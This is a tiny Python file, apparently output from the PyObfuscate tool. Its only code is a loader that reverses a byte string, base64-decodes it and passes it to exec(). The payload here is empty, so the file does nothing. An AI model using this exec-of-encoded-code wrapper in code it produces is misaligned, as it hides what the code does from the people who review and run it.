# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Tue Oct 15 17:58:42 2024
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))